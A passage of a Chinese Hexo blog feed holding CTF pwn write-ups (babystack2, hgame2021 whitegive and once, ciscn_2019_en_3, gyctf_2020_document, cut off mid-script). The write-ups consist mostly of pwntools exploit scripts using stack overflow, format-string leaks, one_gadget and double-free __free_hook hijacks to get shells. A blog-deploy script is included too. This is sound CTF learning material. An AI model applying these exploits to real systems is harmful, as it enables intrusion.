class="string">&#x27;cccc&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line">    de(<span class="number">1</span>)</span><br><span class="line">    magic=<span class="number">0x6020A0</span></span><br><span class="line">    edit(<span class="number">0</span>,<span class="number">0x50</span>,<span class="number">0x20</span> * <span class="string">&quot;a&quot;</span> + p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(<span class="number">0</span>)+p64(magic-<span class="number">10</span>))</span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">&#x27;dddd&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;4869&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h1 id="bjdctf-2020-babystack2"><a href="#bjdctf-2020-babystack2" class="headerlink" title="bjdctf_2020_babystack2"></a>bjdctf_2020_babystack2</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">pe=<span class="string">&#x27;./bjdctf_2020_babystack2&#x27;</span></span><br><span class="line">libc_23=<span class="string">&#x27;./libc-2.23.so&#x27;</span></span><br><span class="line">libc_27=<span class="string">&#x27;./libc-2.27.so&#x27;</span></span><br><span class="line">ip,port = <span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26309</span></span><br><span class="line">elf=ELF(pe)</span><br><span class="line">libc=ELF(libc_23)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    p = remote(ip,port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(pe)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_one</span>():</span>  <span class="comment">#one_gadget</span></span><br><span class="line">    <span class="keyword">if</span>(arch == <span class="string">&#x27;64&#x27;</span>):</span><br><span class="line">        <span class="keyword">if</span>(version == <span class="string">&#x27;2.23&#x27;</span>):</span><br><span class="line">            <span class="comment">#one = [0x45216, 0x4526a, 0xf02a4, 0xf1147]</span></span><br><span class="line">            one = [<span class="number">0x45226</span>, <span class="number">0x4527a</span>, <span class="number">0xf0364</span>, <span class="number">0xf1207</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (version == <span class="string">&#x27;2.27&#x27;</span>):</span><br><span class="line">            <span class="comment">#one = [0x4f2c5 , 0x4f322 , 0x10a38c]</span></span><br><span class="line">            one = [<span class="number">0x4f365</span>, <span class="number">0x4f3c2</span>, <span class="number">0x10a45c</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> one</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">shell_addr = <span class="number">0x0400726</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x10</span> + <span class="string">&#x27;bbbbbbbb&#x27;</span> + p64(shell_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\js\APlayer.min.js&quot; class=&quot;aplayer-se</summary>
      
    
    
    
    <category term="buuctf" scheme="http://example.com/categories/buuctf/"/>
    
    
    <category term="ctf" scheme="http://example.com/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>hgame2021-week1-pwn</title>
    <link href="http://example.com/2021/02/11/hgame2021-week1-pwn/"/>
    <id>http://example.com/2021/02/11/hgame2021-week1-pwn/</id>
    <published>2021-02-10T16:02:39.000Z</published>
    <updated>2021-02-10T16:09:35.468Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><p>没怎么做，就写了两题，另外两道没怎么看官方已经给出了writeup，不过第一周上的这些题感觉要把新手们劝退了。。。。。。。。。</p><h1 id="whitegive"><a href="#whitegive" class="headerlink" title="whitegive"></a>whitegive</h1><p>签到题直接调试看以下寄存器情况就知道了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">pe=<span class="string">&#x27;./whitegive&#x27;</span></span><br><span class="line"><span class="comment"># libc_23=&#x27;./libc-2.23.so&#x27;</span></span><br><span class="line"><span class="comment"># libc_27=&#x27;./libc-2.27.so&#x27;</span></span><br><span class="line">ip,port = <span class="string">&#x27;182.92.108.71&#x27;</span>,<span class="number">30210</span></span><br><span class="line">elf=ELF(pe)</span><br><span class="line"><span class="comment"># libc=ELF(libc_23)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    p = remote(ip,port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(pe)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_one</span>():</span>  <span class="comment">#one_gadget</span></span><br><span class="line">    <span class="keyword">if</span>(arch == <span class="string">&#x27;64&#x27;</span>):</span><br><span class="line">        <span class="keyword">if</span>(version == <span class="string">&#x27;2.23&#x27;</span>):</span><br><span class="line">            <span class="comment">#one = [0x45216, 0x4526a, 0xf02a4, 0xf1147]</span></span><br><span class="line">            one = [<span class="number">0x45226</span>, <span class="number">0x4527a</span>, <span class="number">0xf0364</span>, <span class="number">0xf1207</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (version == <span class="string">&#x27;2.27&#x27;</span>):</span><br><span class="line">            <span class="comment">#one = [0x4f2c5 , 0x4f322 , 0x10a38c]</span></span><br><span class="line">            one = [<span class="number">0x4f365</span>, <span class="number">0x4f3c2</span>, <span class="number">0x10a45c</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> one</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;password:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;4202514&#x27;</span></span><br><span class="line">success(<span class="string">&#x27;payload = &#x27;</span> + payload)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="once"><a href="#once" class="headerlink" title="once"></a>once</h1><p>用libc-2.23的环境打通的，题目是2.27的，一些偏移需要调。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">pe=<span class="string">&#x27;./once&#x27;</span></span><br><span class="line">libc_23=<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line">libc_27=<span class="string">&#x27;./libc-2.27.so&#x27;</span></span><br><span class="line">ip,port = <span class="string">&#x27;182.92.108.71&#x27;</span>,<span class="number">30210</span></span><br><span class="line">elf=ELF(pe)</span><br><span class="line">libc=ELF(libc_23)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    p = remote(ip,port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(pe)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_one</span>():</span>  <span class="comment">#one_gadget</span></span><br><span class="line">    <span class="keyword">if</span>(arch == <span class="string">&#x27;64&#x27;</span>):</span><br><span class="line">        <span class="keyword">if</span>(version == <span class="string">&#x27;2.23&#x27;</span>):</span><br><span class="line">            <span class="comment">#one = [0x45216, 0x4526a, 0xf02a4, 0xf1147]</span></span><br><span class="line">            one = [<span class="number">0x45226</span>, <span class="number">0x4527a</span>, <span class="number">0xf0364</span>, <span class="number">0xf1207</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (version == <span class="string">&#x27;2.27&#x27;</span>):</span><br><span class="line">            <span class="comment">#one = [0x4f2c5 , 0x4f322 , 0x10a38c]</span></span><br><span class="line">            one = [<span class="number">0x4f3d5</span>, <span class="number">0x4f432</span>, <span class="number">0x10a41c</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> one</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">pop_ret= <span class="number">0x0000000000001283</span></span><br><span class="line">start=<span class="number">0x00000000000011D2</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;It is your turn: &#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;%11$p&#x27;</span>+<span class="string">&#x27;%13$p&#x27;</span>+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">30</span>+<span class="string">&#x27;\xD2\x11&#x27;</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment"># p.recv(8)</span></span><br><span class="line">vuln=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">print(<span class="built_in">type</span>(vuln))</span><br><span class="line">libc_start_main_addr=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">240</span></span><br><span class="line">print(<span class="built_in">type</span>(libc_start_main_addr))</span><br><span class="line">success(<span class="string">&#x27;vuln = &#x27;</span> + <span class="built_in">hex</span>(vuln))</span><br><span class="line">success(<span class="string">&quot;libc_start_main = &quot;</span>+ <span class="built_in">hex</span>(libc_start_main_addr))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">bin_sh_libc=<span class="built_in">next</span>(libc.search(<span class="string">&quot;/bin/sh&quot;</span>))</span><br><span class="line">system_libc=libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">libc_start_main_libc=libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">offset=<span class="built_in">int</span>(libc_start_main_addr)-libc_start_main_libc</span><br><span class="line">system_addr=system_libc+offset</span><br><span class="line">bin_addr=bin_sh_libc+offset</span><br><span class="line">success(<span class="string">&#x27;offset: &#x27;</span> + <span class="built_in">hex</span>(offset))</span><br><span class="line">success(<span class="string">&quot;system: &quot;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line">success(<span class="string">&quot;bin_addr: &quot;</span> + <span class="built_in">hex</span>(bin_addr))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;turn: &#x27;</span>)</span><br><span class="line">pop=vuln+<span class="number">177</span></span><br><span class="line">payload1=<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x28</span>+p64(offset+<span class="number">0x45226</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\js\APlayer.min.js&quot; class=&quot;aplayer-se</summary>
      
    
    
    
    <category term="hgame2021" scheme="http://example.com/categories/hgame2021/"/>
    
    
    <category term="ctf" scheme="http://example.com/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>超实用更新博客脚本</title>
    <link href="http://example.com/2021/02/04/%E8%B6%85%E5%AE%9E%E7%94%A8%E6%9B%B4%E6%96%B0%E5%8D%9A%E5%AE%A2%E8%84%9A%E6%9C%AC/"/>
    <id>http://example.com/2021/02/04/%E8%B6%85%E5%AE%9E%E7%94%A8%E6%9B%B4%E6%96%B0%E5%8D%9A%E5%AE%A2%E8%84%9A%E6%9C%AC/</id>
    <published>2021-02-04T15:39:50.000Z</published>
    <updated>2021-02-10T16:22:04.322Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><p>平时一步一步的操作也太麻烦了，直接上脚本就完事了。适用于gitee和github</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.firefox.firefox_binary <span class="keyword">import</span> FirefoxBinary</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common <span class="keyword">import</span> alert</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.action_chains <span class="keyword">import</span> ActionChains</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support <span class="keyword">import</span> expected_conditions <span class="keyword">as</span> EC</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support <span class="keyword">import</span> wait</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support.wait <span class="keyword">import</span> WebDriverWait</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.alert <span class="keyword">import</span> Alert</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span>():</span></span><br><span class="line">    <span class="comment">####-----------------针对github和gitee----------------------------</span></span><br><span class="line">    os.system(<span class="string">&#x27;d: &amp;&amp; cd hexo &amp;&amp; hexo clean &amp;&amp; hexo g &amp;&amp; hexo d&#x27;</span>)  <span class="comment">#文件夹路径，直接完成hexo clean； hexo g； hexo d的操作</span></span><br><span class="line">    <span class="comment">####-----------------下面的主要是针对gitee自动化更新page，不用于github-------------------</span></span><br><span class="line">    <span class="comment"># 模拟浏览器打开到gitee登录界面</span></span><br><span class="line">    driver = webdriver.Chrome()</span><br><span class="line">    <span class="comment"># binary = FirefoxBinary(&#x27;D:\Firefox\firefox.exe&#x27;)</span></span><br><span class="line">    <span class="comment"># driver = webdriver.Firefox(firefox_binary=binary)</span></span><br><span class="line">    driver.get(<span class="string">&#x27;https://gitee.com/login&#x27;</span>)</span><br><span class="line">    <span class="comment"># 将窗口最大化</span></span><br><span class="line">    <span class="comment"># driver.maximize_window(&quot;chromedriver.exe&quot;)</span></span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 输入账号--通过html的id属性定位输入位置--改为你的账号</span></span><br><span class="line">    user_login = driver.find_element_by_id(<span class="string">&#x27;user_login&#x27;</span>)</span><br><span class="line">    user_login.send_keys(<span class="string">&quot;your id&quot;</span>)<span class="comment">#填入你的账号</span></span><br><span class="line">    <span class="comment"># 输入密码--通过html的id属性定位输入位置--改为你的密码</span></span><br><span class="line">    driver.find_element_by_id(<span class="string">&#x27;user_password&#x27;</span>).send_keys(<span class="string">&quot;your password&quot;</span>)<span class="comment">#填入你的密码</span></span><br><span class="line">    <span class="comment"># 点击登录按钮--通过xpath确定点击位置</span></span><br><span class="line">    driver.find_element_by_xpath(</span><br><span class="line">        <span class="string">&#x27;/html/body/div[2]/div[2]/div[1]/div/div[2]/div/form[1]/div[2]/div/div/div[4]/input&#x27;</span>).click()</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 切换到gitee pages界面--改为you_gitee_id</span></span><br><span class="line">    driver.get(<span class="string">&#x27;https://gitee.com/tordan/tordan/pages&#x27;</span>)</span><br><span class="line">    <span class="comment"># 点击更新按钮--通过xpath确定点击位置</span></span><br><span class="line">    element = driver.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;pages-branch&quot;]/div[7]&#x27;</span>)</span><br><span class="line">    ActionChains(driver).move_to_element(element).click().perform()</span><br><span class="line">    <span class="comment"># 确认更新提示框--这个函数的作用是确认提示框</span></span><br><span class="line">    <span class="comment"># Alert(driver).accept()</span></span><br><span class="line">    <span class="comment"># dig_confirm = driver.switch_to.alert</span></span><br><span class="line">    <span class="comment"># time.sleep(1)</span></span><br><span class="line">    <span class="comment"># print(dig_confirm.text)</span></span><br><span class="line">    <span class="comment"># dig_confirm.accept()</span></span><br><span class="line">    WebDriverWait(driver, <span class="number">20</span>, <span class="number">0.5</span>).until(EC.alert_is_present())</span><br><span class="line">    driver.switch_to.alert.text</span><br><span class="line">    driver.switch_to_alert().accept()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 等待5秒更新</span></span><br><span class="line">    time.sleep(<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 这个print其实没事什么用,如果真的要测试脚本是否运行成功，可以用try来抛出异常</span></span><br><span class="line">    print(<span class="string">&quot;成功&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 脚本运行成功,退出浏览器</span></span><br><span class="line">    driver.quit()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 写上更新日志</span></span><br><span class="line">    <span class="comment"># 我这里是写在D盘，可以改为自己喜欢的目录</span></span><br><span class="line">    fp = <span class="built_in">open</span>(<span class="string">&quot;C://Users//13972//Desktop//log.txt&quot;</span>, <span class="string">&quot;a+&quot;</span>)</span><br><span class="line">    now_time = time.strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>, time.localtime())</span><br><span class="line">    fp.write(<span class="string">&#x27;————————————————成功部署————————————————&#x27;</span>)</span><br><span class="line">    fp.write(<span class="string">&quot;部署时间:&#123;0&#125;\n&quot;</span>.<span class="built_in">format</span>(now_time))</span><br><span class="line">    fp.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span>():</span></span><br><span class="line">    print(<span class="string">&#x27;输入文章名字&#x27;</span>)</span><br><span class="line">    a = sys.stdin.readline().strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    os.system(<span class="string">&#x27;d: &amp;&amp; cd hexo\source\_posts &amp;&amp; hexo new %s &amp;&amp; rd %s&#x27;</span> % (a,a))  <span class="comment">#博客文件夹路径</span></span><br><span class="line">    print(<span class="string">&#x27;创建博客成功！！！&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    print(<span class="string">&#x27;请输入你的选择：&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;1、创建博客&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;2、更新博客&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">input</span> = sys.stdin.readline().strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    print(<span class="string">&quot;你的选择是：&quot;</span> + <span class="built_in">input</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">input</span> == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        new()</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">input</span> == <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">        update()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\js\APlayer.min.js&quot; class=&quot;aplayer-se</summary>
      
    
    
    
    <category term="python脚本" scheme="http://example.com/categories/python%E8%84%9A%E6%9C%AC/"/>
    
    
    <category term="博客" scheme="http://example.com/tags/%E5%8D%9A%E5%AE%A2/"/>
    
  </entry>
  
  <entry>
    <title>堆复习3-double—free</title>
    <link href="http://example.com/2021/01/24/%E5%A0%86%E5%A4%8D%E4%B9%A03-double%E2%80%94free/"/>
    <id>http://example.com/2021/01/24/%E5%A0%86%E5%A4%8D%E4%B9%A03-double%E2%80%94free/</id>
    <published>2021-01-24T09:48:32.000Z</published>
    <updated>2021-02-04T14:58:34.395Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="ciscn-2019-en-3"><a href="#ciscn-2019-en-3" class="headerlink" title="ciscn_2019_en_3"></a>ciscn_2019_en_3</h1><p>1、首先利用puts函数只要输入长度为8就能泄露出一个基地址</p><p>2、申请两个chunk，chunk1内容为/bin/sh</p><p>3、对chunk0进行double free并对__free_hook劫持，改为system</p><p>4、释放chunk1</p><p>比较基础，只用到了double free和free_hook劫持</p><h1 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">pe=<span class="string">&#x27;./ciscn_2019_en_3&#x27;</span></span><br><span class="line">libc_23=<span class="string">&#x27;./libc-2.23.so&#x27;</span></span><br><span class="line">libc_27=<span class="string">&#x27;./libc-2.27.so&#x27;</span></span><br><span class="line">ip,port = <span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27452</span></span><br><span class="line">elf=ELF(pe)</span><br><span class="line">libc=ELF(libc_27)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    p = remote(ip,port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(pe)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_one</span>():</span>  <span class="comment">#one_gadget</span></span><br><span class="line">    <span class="keyword">if</span>(arch == <span class="string">&#x27;64&#x27;</span>):</span><br><span class="line">        <span class="keyword">if</span>(version == <span class="string">&#x27;2.23&#x27;</span>):</span><br><span class="line">            <span class="comment">#one = [0x45216, 0x4526a, 0xf02a4, 0xf1147]</span></span><br><span class="line">            one = [<span class="number">0x45226</span>, <span class="number">0x4527a</span>, <span class="number">0xf0364</span>, <span class="number">0xf1207</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (version == <span class="string">&#x27;2.27&#x27;</span>):</span><br><span class="line">            <span class="comment">#one = [0x4f2c5 , 0x4f322 , 0x10a38c]</span></span><br><span class="line">            one = [<span class="number">0x4f365</span>, <span class="number">0x4f3c2</span>, <span class="number">0x10a45c</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> one</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size, content</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Input your choice:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Please input the size of story: \n&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">p.recvuntil(<span class="string">&quot;please inpute the story: \n&quot;</span>)</span><br><span class="line">p.sendline(content)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Input your choice:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Please input the index:\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;name?\n&#x27;</span>,<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;input your ID.\n&#x27;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">data=u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x5f6a0</span>-<span class="number">231</span></span><br><span class="line">success(<span class="string">&#x27;data:&#x27;</span> + <span class="built_in">hex</span>(data))</span><br><span class="line">base=data-libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;base:&#x27;</span> + <span class="built_in">hex</span>(base))</span><br><span class="line">success(<span class="string">&#x27;libc_start_main_offset:&#x27;</span> + <span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]))</span><br><span class="line">free_hook=base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system=base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;system_offset:&#x27;</span> + <span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">success(<span class="string">&#x27;system:&#x27;</span> + <span class="built_in">hex</span>(system))</span><br><span class="line">success(<span class="string">&#x27;free_hook:&#x27;</span> + <span class="built_in">hex</span>(free_hook))</span><br><span class="line">success(<span class="string">&#x27;free_hook_offset:&#x27;</span> + <span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"><span class="comment"># add(0x20,&#x27;bbbb&#x27;)</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x20</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">0x20</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">0x20</span>,p64(system))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h1 id="gyctf-2020-document"><a href="#gyctf-2020-document" class="headerlink" title="gyctf_2020_document"></a>gyctf_2020_document</h1><p>同样是free_hook劫持的问题</p><p>1、有uaf，可以直接泄露libc地址<br>2、泄露libc后，由于第一个chunk被释放了，并且edit函数编辑的是chunk+0x10的偏移位置，所以我们再申请两个chunk<br>3、这个时候，我们就可以发现idx为0的头部chunk指向了，idx为3的头部chunk的pre_size位，这时候已经overlap了，所以直接覆盖chunk3指向堆的那个偏移，并且要与free_hook或者malloc_hook的偏移相差0x10<br>4、经过调试发现free_hook周围都是0，覆盖了free_hook为system</p><p>5、释放chunk1拿到shell</p><h1 id="exp：-1"><a href="#exp：-1" class="headerlink" title="exp："></a>exp：</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span 